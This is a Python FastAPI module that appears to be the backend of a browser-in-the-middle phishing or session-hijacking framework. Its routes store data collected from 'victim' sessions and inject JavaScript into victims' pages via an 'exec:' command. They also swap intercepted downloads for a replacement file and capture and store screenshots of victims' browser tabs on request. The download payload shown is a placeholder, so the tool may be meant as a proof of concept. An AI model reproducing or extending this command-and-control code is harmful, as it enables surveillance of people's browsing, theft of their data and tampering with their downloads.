"""Authenticated victim collection and event callback routes."""

from .private_common import (
    APIRouter,
    Depends,
    EventProxyRequest,
    HTTPException,
    JSONResponse,
    Path,
    SiteInfoRequest,
    SnapshotUploadRequest,
    UnsafeRemoteURLError,
    UploadValidationError,
    VictimDataRequest,
    add_victim_event,
    asyncio,
    base64,
    configured_upload_limit,
    decode_png_image,
    get_victim,
    json,
    logger,
    os,
    resolve_local_file,
    save_data_collection,
    settings,
    snapshot_requests,
    uuid,
    validate_public_http_url,
    validate_transfer_filename,
    verify_victim_api_token,
    ws_manager,
)

api_router = APIRouter()
raw_router = APIRouter()


@api_router.post("/sessions/{victim_id}/site-info")
async def victim_site_info(
    victim_id: str,
    data: SiteInfoRequest,
    auth: bool = Depends(verify_victim_api_token),
):
    """Called by victim VNC container to update title/favicon"""
    try:
        title = data.title
        favicon = data.favicon
        if favicon and not favicon.lower().startswith("data:"):
            try:
                favicon = await asyncio.to_thread(
                    validate_public_http_url,
                    favicon,
                )
            except UnsafeRemoteURLError as exc:
                logger.warning(
                    "Rejected unsafe favicon URL for victim %s: %s",
                    victim_id,
                    exc,
                )
                favicon = ""

        logger.info(f"📄 Site info from victim {victim_id}: {title}")

        if ws_manager.is_victim_connected(victim_id):
            safe_title = json.dumps(str(title))
            safe_favicon = json.dumps(str(favicon))
            payload = f"""
            document.title = {safe_title};
            const favicon = {safe_favicon};
            if (favicon) {{
                document.querySelectorAll("link[rel~='icon']").forEach(el => el.remove());
                const faviconLink = document.createElement("link");
                faviconLink.rel = "icon";
                faviconLink.referrerPolicy = "no-referrer";
                faviconLink.href = favicon;
                document.head.appendChild(faviconLink);
            }}
            """
            await ws_manager.send_to_victim(victim_id, f"exec:{payload}")
            return {"status": "success"}
        else:
            return JSONResponse({"status": "error", "message": "Victim not connected"}, status_code=404)

    except Exception:
        logger.exception("Failed to update site info for victim %s", victim_id)
        return JSONResponse(
            {"status": "error", "message": "Failed to update site info"},
            status_code=500,
        )


@api_router.post("/sessions/{victim_id}/data")
@raw_router.post("/{victim_id}/data")
async def victim_data_collection(
    victim_id: str,
    data: VictimDataRequest,
    auth: bool = Depends(verify_victim_api_token),
):
    """
    API privata per victim containers (network isolation)
    Proxy ad admin backend per evitare concurrent SQLite writes
    """
    try:
        # Proxy ad admin backend (unico SQLite writer)
        save_data_collection(
            victim_id=victim_id,
            data_type=data.data_type,
            file_path=data.file_path,
            module_id=data.module_id,
            file_size=data.file_size_bytes,
            metadata=data.normalized_metadata(),
        )
        # update_campaign_stats(victim_id, data_type)

        logger.info(f"📥 Data collected: {data.data_type} from victim {victim_id}")

        return {"status": "success", "data_type": data.data_type}

    except HTTPException:
        raise
    except Exception:
        logger.exception("Failed to save victim data collection")
        return JSONResponse(
            {
                "status": "error",
                "message": "Unable to save collected data",
            },
            status_code=500,
        )


@api_router.post("/sessions/{victim_id}/downloads/{file_name}/deliver")
async def deliver_collected_download(
    victim_id: str,
    file_name: str,
    auth: bool = Depends(verify_victim_api_token),
):
    """Deliver one PoC-replaced copy of an intercepted download."""
    if not ws_manager.is_victim_connected(victim_id):
        raise HTTPException(status_code=404, detail="Victim not connected")

    try:
        safe_filename = validate_transfer_filename(file_name)
        original_file = resolve_local_file(
            Path(settings.STORAGE_PATH)
            / victim_id
            / "files_hijacked",
            safe_filename,
        )
    except UploadValidationError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    replaced_content = b"Hijacked Download"
    encoded = base64.b64encode(replaced_content).decode("ascii")
    delivered = await ws_manager.send_to_victim(
        victim_id,
        f"file:{safe_filename}|{encoded}",
    )
    if not delivered:
        raise HTTPException(status_code=503, detail="Victim delivery failed")

    logger.info(
        "Delivered replaced copy of %s to victim %s (original: %s bytes)",
        safe_filename,
        victim_id,
        original_file.stat().st_size,
    )
    return {
        "success": True,
        "filename": safe_filename,
        "size": len(replaced_content),
        "original_size": original_file.stat().st_size,
    }


@api_router.post("/sessions/{victim_id}/events")
async def add_event(
    victim_id: str,
    payload: EventProxyRequest,
    auth: bool = Depends(verify_victim_api_token),
):
    """Proxy events from browser extension to backend API"""
    try:
        # 1. Verify victim exists
        victim = await asyncio.to_thread(get_victim, victim_id)
        if not victim:
            raise HTTPException(status_code=404, detail="Session not found")

        event_type = payload.event_type

        logger.info(f"📥 Event from victim {victim_id} - Type: {event_type}")

        # The admin API uses the synchronous requests client. Keep both
        # network calls off the campaign application's event loop.
        await asyncio.to_thread(
            add_victim_event,
            victim_id,
            payload.model_dump(mode="json", exclude_none=True),
        )

        # 4. Return
        return {
            "status": "success",
            "event_type": event_type
        }

    except HTTPException:
        raise
    except Exception:
        logger.exception("Failed to process event for victim %s", victim_id)
        raise HTTPException(status_code=500, detail="Failed to process event")


@api_router.get("/sessions/{victim_id}/snapshot-requests")
async def get_snapshot_requests(
    victim_id: str,
    auth: bool = Depends(verify_victim_api_token),
):
    """Polled by the victim's browser extension for pending snapshot requests."""
    pending = await snapshot_requests.pending_for(victim_id)
    return {"pending": pending or None}


@api_router.post("/sessions/{victim_id}/snapshot")
async def upload_snapshot(
    victim_id: str,
    data: SnapshotUploadRequest,
    auth: bool = Depends(verify_victim_api_token),
):
    """Receive a PNG snapshot captured by the victim's browser extension."""
    try:
        safe_victim_id = validate_transfer_filename(victim_id)
    except UploadValidationError as exc:
        raise HTTPException(status_code=404, detail="Session not found") from exc

    image = decode_png_image(data.image, configured_upload_limit())

    if not await snapshot_requests.claim(safe_victim_id, data.request_id):
        raise HTTPException(
            status_code=404,
            detail="Unknown or expired snapshot request",
        )

    filename = f"{uuid.uuid4().hex}.png"
    directory = Path(settings.STORAGE_PATH) / safe_victim_id / "snapshots"
    try:
        directory.mkdir(parents=True, exist_ok=True)
        destination = directory / filename
        file_descriptor = os.open(
            destination,
            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
            0o600,
        )
        with os.fdopen(file_descriptor, "wb") as output:
            output.write(image)
    except OSError:
        logger.exception(
            "Failed to store snapshot for victim %s",
            safe_victim_id,
        )
        raise HTTPException(status_code=500, detail="Failed to store snapshot")

    relative_path = f"snapshots/{filename}"
    try:
        await asyncio.to_thread(
            save_data_collection,
            victim_id=safe_victim_id,
            data_type="screenshot",
            file_path=relative_path,
            file_size=len(image),
            metadata={
                "url": data.url,
                "title": data.title,
                "request_id": data.request_id,
                "capture_mode": "browser_tab",
            },
        )
    except Exception:
        logger.exception(
            "Failed to record snapshot collection for victim %s",
            safe_victim_id,
        )
        raise HTTPException(status_code=502, detail="Failed to record snapshot")

    logger.info(
        f"📸 Session snapshot stored for victim {safe_victim_id}: {relative_path}"
    )
    return {"status": "success", "file_path": relative_path}
